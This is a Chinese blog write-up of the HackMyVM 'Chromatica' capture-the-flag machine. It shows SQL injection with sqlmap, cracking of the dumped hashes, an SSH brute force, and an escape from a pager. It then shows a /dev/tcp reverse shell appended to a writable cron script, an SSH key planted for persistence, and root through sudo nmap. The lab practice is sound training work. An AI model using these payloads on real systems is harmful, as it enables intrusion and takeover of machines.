---
layout: config.default_layout
title: HackMyVM-Chromatica
date: 2025-04-19 16:31:56
updated: 2025-04-19 16:33:12
comments: true
tags: [Linux靶机,HackMyVM,SQL注入]
categories: 靶机
---

# Chromatica.

> https://hackmyvm.eu/machines/machine.php?vm=Chromatica
> 

Notes：**Hope you enjoy it as i did. Credit to: https://shorturl.at/cnHNQ**

## 前期踩点

```bash
➜  Chromatica nmap -sP 192.168.56.0/24                   
Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-04-18 23:16 EDT
Nmap scan report for 192.168.56.1
Host is up (0.00032s latency).
MAC Address: 0A:00:27:00:00:09 (Unknown)
Nmap scan report for 192.168.56.2
Host is up (0.00046s latency).
MAC Address: 08:00:27:81:EF:A0 (Oracle VirtualBox virtual NIC)
Nmap scan report for 192.168.56.44
Host is up (0.00047s latency).
MAC Address: 08:00:27:2C:9A:BC (Oracle VirtualBox virtual NIC)
```

```bash
➜Chromatica nmap -sT -min-rate 10000 -p- 192.168.56.44
Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-04-18 23:16 EDT
Nmap scan report for 192.168.56.44
Host is up (0.00023s latency).
Not shown: 65532 closed tcp ports (conn-refused)
PORT     STATE SERVICE
22/tcp   open  ssh
80/tcp   open  http
5353/tcp open  mdns
MAC Address: 08:00:27:2C:9A:BC (Oracle VirtualBox virtual NIC)

Nmap done: 1 IP address (1 host up) scanned in 8.07 seconds
```

```bash
➜  Chromatica nmap -sT -A -T4 -O -p 22,80,5353 192.168.56.44
Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-04-18 23:17 EDT
Nmap scan report for 192.168.56.44
Host is up (0.00075s latency).

PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.1 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   256 7c:94:7f:cb:4a:d5:8b:9f:9e:ff:7b:7a:59:ff:75:b5 (ECDSA)
|_  256 ed:94:2a:fc:30:30:cc:07:ae:27:7d:ca:92:01:49:31 (ED25519)
80/tcp   open  http    Apache httpd 2.4.52 ((Ubuntu))
|_http-server-header: Apache/2.4.52 (Ubuntu)
|_http-title: Chromatica|Coming Soon..... 
5353/tcp open  domain  dnsmasq 2.86
| dns-nsid: 
|_  bind.version: dnsmasq-2.86
MAC Address: 08:00:27:2C:9A:BC (Oracle VirtualBox virtual NIC)
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
Device type: general purpose
Running: Linux 4.X|5.X
OS CPE: cpe:/o:linux:linux_kernel:4 cpe:/o:linux:linux_kernel:5
OS details: Linux 4.15 - 5.8
Network Distance: 1 hop
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

TRACEROUTE
HOP RTT     ADDRESS
1   0.75 ms 192.168.56.44

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 47.40 seconds
```

```bash
➜  Chromatica nmap -script=vuln 22,80,5353 192.168.56.44    
Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-04-18 23:18 EDT
Failed to resolve "22,80,5353".
Nmap scan report for 192.168.56.44
Host is up (0.00021s latency).
Not shown: 998 closed tcp ports (reset)
PORT   STATE SERVICE
22/tcp open  ssh
80/tcp open  http
|_http-stored-xss: Couldn't find any stored XSS vulnerabilities.
|_http-csrf: Couldn't find any CSRF vulnerabilities.
| http-fileupload-exploiter: 
|   
|_    Couldn't find a file-type field.
|_http-dombased-xss: Couldn't find any DOM based XSS.
| http-enum: 
|   /robots.txt: Robots file
|   /css/: Potentially interesting directory w/ listing on 'apache/2.4.52 (ubuntu)'
|_  /js/: Potentially interesting directory w/ listing on 'apache/2.4.52 (ubuntu)'
MAC Address: 08:00:27:2C:9A:BC (Oracle VirtualBox virtual NIC)

Nmap done: 1 IP address (1 host up) scanned in 38.43 seconds
```

`dnsmasq 2.86` 好像存在缓冲区漏洞，但是现在没办法利用

## Web

### 信息收集 - 1

访问 `HTTP` 服务

![image.png](image.png)

目录扫描

```bash
➜  Chromatica gobuster dir -u http://192.168.56.44 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x php,txt,html,zip -b 403,404                                                              
===============================================================
Gobuster v3.6
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://192.168.56.44
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
[+] Negative Status codes:   403,404
[+] User Agent:              gobuster/3.6
[+] Extensions:              php,txt,html,zip
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/index.html           (Status: 200) [Size: 4047]
/assets               (Status: 301) [Size: 315] [--> http://192.168.56.44/assets/]
/css                  (Status: 301) [Size: 312] [--> http://192.168.56.44/css/]
/js                   (Status: 301) [Size: 311] [--> http://192.168.56.44/js/]
/javascript           (Status: 301) [Size: 319] [--> http://192.168.56.44/javascript/]
/robots.txt           (Status: 200) [Size: 36]
Progress: 1102800 / 1102805 (100.00%)
===============================================================
Finished
===============================================================
```

查看 `robots.txt`，给我们新的目录`/dev-portal/`

![image.png](image1.png)

再扫描一遍，发现什么都扫描不出来

```bash
➜  Chromatica gobuster dir -u http://192.168.56.44/dev-portal/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x php,txt,html,zip -b 403,404
===============================================================
Gobuster v3.6
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://192.168.56.44/dev-portal/
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
[+] Negative Status codes:   403,404
[+] User Agent:              gobuster/3.6
[+] Extensions:              php,txt,html,zip
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
Progress: 1102800 / 1102805 (100.00%)
===============================================================
Finished
===============================================================
```

访问页面被 `403` 了

![image.png](image2.png)

想起上面`robots.txt` 文件的 `user-agent：dev` ，我们将 `UA` 改为 `dev` 再去访问

已经不是 `403` 了，变成重定向了

![image.png](image3.png)

跟随重定向，页面有一个搜索框

![image.png](image4.png)

搜索后点抓包

![image.png](image5.png)

其中的注释：`please for the love of god someone paint this page a color will ya it looks dreadfull uhhhhj`看在上帝的份上，谁能给这个页面涂点颜色看看，看起来太可怕了，呃

### SQL 注入

测试一下请求参数，发现存在`SQL`注入

```bash
/dev-portal/search.php?city=xxx' --+
```

`Sqlmap` 梭哈

```bash
➜  Chromatica sqlmap -r packet -batch                                                                    
        ___                                                                                                       
       __H__
 ___ ___[)]_____ ___ ___  {1.8.11#stable}
|_ -| . ["]     | .'| . | 
|___|_  [(]_|_|_|__,|  _|                                                                                         
      |_|V...       |_|   https://sqlmap.org                                                                                                                                                                                        

[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and ar
e not responsible for any misuse or damage caused by this program
                                                                                                                                                                                                                                    
[*] starting @ 00:55:21 /2025-04-19/
                                                         
[00:55:21] [INFO] parsing HTTP request from 'packet'   
custom injection marker ('*') found in option '-u'. Do you want to process it? [Y/n/q] Y
[00:55:32] [INFO] 'ORDER BY' technique appears to be usable. This should reduce the time needed to find the right number of query columns. Automatically extending the range for current UNION query injection technique test       
[00:55:32] [INFO] target URL appears to have 4 columns in query                                                   
[00:55:32] [INFO] URI parameter '#1*' is 'Generic UNION query (NULL) - 1 to 20 columns' injectable                
URI parameter '#1*' is vulnerable. Do you want to keep testing the others (if any)? [y/N] N              
sqlmap identified the following injection point(s) with a total of 61 HTTP(s) requests: 

......
                          
---         
Parameter: #1* (URI)                     
    Type: time-based blind
    Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)                                                     
    Payload: http://192.168.56.44/dev-portal/search.php?city=' AND (SELECT 2276 FROM (SELECT(SLEEP(5)))KNyG) AND 'tKEh'='tKEh                                                                                                       

    Type: UNION query                                                                                                                                                                                                               
    Title: Generic UNION query (NULL) - 4 columns                                                                 
    Payload: http://192.168.56.44/dev-portal/search.php?city=' UNION ALL SELECT NULL,NULL,CONCAT(0x7171626b71,0x4363747548505149627773496c574576674e636174734c774968547275574d597058494456456363,0x716a707071),NULL-- -             
---                                 
[00:55:32] [INFO] the back-end DBMS is MySQL             
web server operating system: Linux Ubuntu 22.04 (jammy)
web application technology: Apache 2.4.52                                                                         
back-end DBMS: MySQL >= 5.0.12 (MariaDB fork)                                                                                                                                                                                       
[00:55:32] [WARNING] HTTP error codes detected during run:                                                        
500 (Internal Server Error) - 25 times                                                                            
[00:55:32] [INFO] fetched data logged to text files under '/root/.local/share/sqlmap/output/192.168.56.44'
                                                         
[*] ending @ 00:55:32 /2025-04-19/    
```

将用户表 Dump 下来

```bash
+----+-----------------------------------------------+-----------+-----------------------------+
| id | password                                      | username  | description                 |
+----+-----------------------------------------------+-----------+-----------------------------+
| 1  | 8d06f5ae0a469178b28bbd34d1da6ef3              | admin     | admin                       |
| 2  | 1ea6762d9b86b5676052d1ebd5f649d7              | dev       | developer account for taz   |
| 3  | 3dd0f70a06e2900693fc4b684484ac85 (keeptrying) | user      | user account for testing    |
| 4  | f220c85e3ff19d043def2578888fb4e5              | dev-selim | developer account for selim |
| 5  | aaf7fb4d4bffb8c8002978a9c9c6ddc9              | intern    | intern                      |
+----+-----------------------------------------------+-----------+-----------------------------+
```

`Sqlmap` 这里只能破解出一个密码，我们使用 John 进行尝试，结果还是一样

```bash
➜  Chromatica john --wordlist=/usr/share/wordlists/rockyou.txt --format=Raw-MD5 pass 
Using default input encoding: UTF-8
Loaded 5 password hashes with no different salts (Raw-MD5 [MD5 256/256 AVX2 8x3])
Warning: no OpenMP support for this hash type, consider --fork=16
Press 'q' or Ctrl-C to abort, almost any other key for status
keeptrying       (?)     
1g 0:00:00:00 DONE (2025-04-19 01:01) 1.923g/s 27583Kp/s 27583Kc/s 110850KC/s  g101485..*7¡Vamos!
Use the "--show --format=Raw-MD5" options to display all of the cracked passwords reliably
Session completed. 
```

但是 `admin` 的 `md5` 值在 `cmd5` 中是可以进行破解的

![image.png](image6.png)

最后也是找到了，`Decode` 地址：https://hashes.com/en/decrypt/hash

![image.png](image7.png)

最后得到密码

```bash
8d06f5ae0a469178b28bbd34d1da6ef3
1ea6762d9b86b5676052d1ebd5f649d7
3dd0f70a06e2900693fc4b684484ac85
f220c85e3ff19d043def2578888fb4e5
aaf7fb4d4bffb8c8002978a9c9c6ddc9
adm!n
flaghere
keeptrying
intern00
```

### 信息收集 - 2

现在拿到用户名密码也没什么用，我们设置 `UA` 再扫描一遍目录

```bash
➜  Chromatica gobuster dir -u http://192.168.56.44/dev-portal/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x php,txt,html,zip -b 403,404 -H 'User-Agent: dev'
===============================================================
Gobuster v3.6
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://192.168.56.44/dev-portal/
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
[+] Negative Status codes:   403,404
[+] User Agent:              gobuster/3.6
[+] Extensions:              php,txt,html,zip
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/index.html           (Status: 200) [Size: 527]
/search.php           (Status: 200) [Size: 844]
/login.php            (Status: 200) [Size: 609]
/assets               (Status: 301) [Size: 326] [--> http://192.168.56.44/dev-portal/assets/]
/css                  (Status: 301) [Size: 323] [--> http://192.168.56.44/dev-portal/css/]
Progress: 1102800 / 1102805 (100.00%)
===============================================================
Finished
===============================================================
```

来到 `login.php` 进行登录

![image.png](image8.png)

但是登录进去什么也没有

![image.png](image9.png)

查看控制台发现状态码 `500`

![image.png](image10.png)

不知道是不是兔子洞，反正是没什么用

### SSH 爆破

我们使用数据库中的用户和密码对 `ssh` 进行爆破

```bash
➜  Chromatica hydra -L users.txt -P passwd.txt -Vv -t 12 192.168.56.44 ssh                                         
                                                                               
Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2025-04-19 01:23:04
[WARNING] Many SSH configurations limit the number of parallel tasks, it is recommended to reduce the tasks: use -t 4
[DATA] max 12 tasks per 1 server, overall 12 tasks, 45 login tries (l:5/p:9), ~4 tries per task
[22][ssh] host: 192.168.56.44   login: dev   password: flaghere
[STATUS] attack finished for 192.168.56.44 (waiting for children to complete tests)                               
1 of 1 target successfully completed, 1 valid password found                                                      
Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2025-04-19 01:23:18 
```

进行 `SSH` 登录，但是直接被弹出来了

```bash
➜  Chromatica ssh dev@192.168.56.44      
dev@192.168.56.44's password: 
Permission denied, please try again.
dev@192.168.56.44's password: 
GREETINGS,
THIS ACCOUNT IS NOT A LOGIN ACCOUNT
IF YOU WANNA DO SOME MAINTENANCE ON THIS ACCOUNT YOU HAVE TO
EITHER CONTACT YOUR ADMIN
OR THINK OUTSIDE THE BOX
BE LAZY AND CONTACT YOUR ADMIN
OR MAYBE YOU SHOULD USE YOUR HEAD MORE heh,,
REGARDS

brightctf{ALM0ST_TH3R3_34897ffdf69}
Connection to 192.168.56.44 closed.
➜  Chromatica 
```

信息：

- 貌似是`flag` `brightctf{ALM0ST_TH3R3_34897ffdf69}`
- 登陆后的信息
    
    ```bash
    您好，
    此帐户并非登录帐户。
    如果您想维护此帐户，您必须
    联系您的管理员。
    或者，跳出固有思维模式。
    偷懒联系您的管理员。
    或者，您应该多动动脑子。
    此致
    ```
    

加上 `-v` 参数查看详细信息

输入密码后可以看到如下信息，表示已经登陆进去了

```bash
Authenticated to 192.168.56.44 ([192.168.56.44]:22) using "password".
debug1: channel 0: new session [client-session] (inactive timeout: 0)
```

我们想办法让连接保留下来，我们可以尝试将窗口缩小，例如：让信息不一下子展现出来

![image.png](image11.png)

这样就保留连接了，然后因为`More`和`Less` 在一定情况下都可以提权的，我们尝试输入`!/bin/bash`

![image.png](image12.png)

这样就获得 `shell` 了

```bash
dev@Chromatica:~$ id
uid=1001(dev) gid=1001(dev) groups=1001(dev)
```

### 为什么会被弹出去呢

`dev` 加目录中可以找到 `user.txt` 上面的是假的…

```bash
dev@Chromatica:~$ cat user.txt 
brightctf{ONE_OCKLOCK_8cfa57b4168}
```

在家目录中还存在一个脚本文件和`txt`文件

```bash
dev@Chromatica:~$ cat hello.txt 
GREETINGS,
THIS ACCOUNT IS NOT A LOGIN ACCOUNT
IF YOU WANNA DO SOME MAINTENANCE ON THIS ACCOUNT YOU HAVE TO
EITHER CONTACT YOUR ADMIN
OR THINK OUTSIDE THE BOX
BE LAZY AND CONTACT YOUR ADMIN
OR MAYBE YOU SHOULD USE YOUR HEAD MORE heh,,
REGARDS

brightctf{ALM0ST_TH3R3_34897ffdf69}
dev@Chromatica:~$ cat bye.sh 
#̣!/bin/bash

/usr/bin/more /home/dev/hello.txt
exit 0
```

看样子是，是让我们登录就马上被赶出来的罪魁祸首。但是在仅仅有这两个文件是无法在我们登陆时直接赶走我们的，可能还存在定时任务，在我们登录时执行 `bye.sh` 脚本

最后可以在 `/etc/ssh/sshd_config.d/dev_config.conf`

```bash
ForceCommand /home/dev/bye.sh
```

作用是强制所有通过 SSH 登录的用户执行指定的命令，在这里就是 `/home/dev/bye.sh` 脚本。

## 提权

### to analyst

查看一下定时任务

```bash
dev@Chromatica:/etc$ cat /etc/crontab
# /etc/crontab: system-wide crontab
# Unlike any other crontab you don't have to run the `crontab'
# command to install the new version when you edit this file
# and files in /etc/cron.d. These files also have username fields,
# that none of the other crontabs do.

SHELL=/bin/sh
# You can also override PATH, but by default, newer versions inherit it from the environment
#PATH=/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin

# Example of job definition:
# .---------------- minute (0 - 59)
# |  .------------- hour (0 - 23)
# |  |  .---------- day of month (1 - 31)
# |  |  |  .------- month (1 - 12) OR jan,feb,mar,apr ...
# |  |  |  |  .---- day of week (0 - 6) (Sunday=0 or 7) OR sun,mon,tue,wed,thu,fri,sat
# |  |  |  |  |
# *  *  *  *  * user-name command to be executed
17 *    * * *   root    cd / && run-parts --report /etc/cron.hourly
25 6    * * *   root    test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.daily )
47 6    * * 7   root    test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.weekly )
52 6    1 * *   root    test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.monthly )
* *     * * *   analyst /bin/bash /opt/scripts/end_of_day.sh
#
```

每分钟，系统都会以 `analyst` 身份自动运行 `/opt/scripts/end_of_day.sh` 脚本；

```bash
* *     * * *   analyst /bin/bash /opt/scripts/end_of_day.sh
```

我们查看一下该脚本的权限

```bash
dev@Chromatica:/opt/scripts$ ls -al
total 12
drwxrwxrwx 2 root    root    4096 Apr 18  2024 .
drwxr-xr-x 6 root    root    4096 Apr 24  2024 ..
-rwxrwxrw- 1 analyst analyst   30 Apr 19 08:00 end_of_day.sh
```

```bash
dev@Chromatica:/opt/scripts$ cat end_of_day.sh 
#this is my end of day script
```

直接写入反弹`shell`语句

```bash
echo "/bin/bash -c 'bash -i >& /dev/tcp/192.168.56.4/1234 0>&1'" >> end_of_day.sh
```

获得 `shell`

```bash
➜  Chromatica nc -lvp 1234             
listening on [any] 1234 ...
192.168.56.44: inverse host lookup failed: Unknown host
connect to [192.168.56.4] from (UNKNOWN) [192.168.56.44] 44846
bash: cannot set terminal process group (4181): Inappropriate ioctl for device
bash: no job control in this shell
analyst@Chromatica:~$ 
```

拿到 `shell` 后第一件事进行持久化，写入公钥

```bash
echo "ssh-rsa xxxxxx" > .ssh/authorized_keys
```

`analyst` 家目录下也有 flag

```bash
analyst@Chromatica:~$ cat analyst.txt 
brightctf{GAZETTO_RUKI_b2f4f50f398}
```

### to root

查看 `analyst` 的 `sudo` 权限

```bash
analyst@Chromatica:~$ sudo -l
Matching Defaults entries for analyst on Chromatica:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin, use_pty

User analyst may run the following commands on Chromatica:
    (ALL : ALL) NOPASSWD: /usr/bin/nmap
```

查看版本

```bash
analyst@Chromatica:~$ sudo /usr/bin/nmap --version
Nmap version 7.80 ( https://nmap.org )
Platform: x86_64-pc-linux-gnu
Compiled with: liblua-5.3.6 openssl-3.0.2 nmap-libssh2-1.8.2 libz-1.2.11 libpcre-8.39 libpcap-1.10.1 nmap-libdnet-1.12 ipv6
Compiled without:
Available nsock engines: epoll poll select
```

通过执行脚本提权

```bash
analyst@Chromatica:~$ TF=$(mktemp)
echo 'os.execute("/bin/sh")' > $TF
sudo nmap --script=$TF
Starting Nmap 7.80 ( https://nmap.org ) at 2025-04-19 08:24 UTC
NSE: Warning: Loading '/tmp/tmp.AJ6TtOxyfs' -- the recommended file extension is '.nse'.
# uid=0(root) gid=0(root) groups=0(root)
```

读取 `root.txt`

```bash
# brightctf{DIR_EN_GREY_59ce1d6c207}
```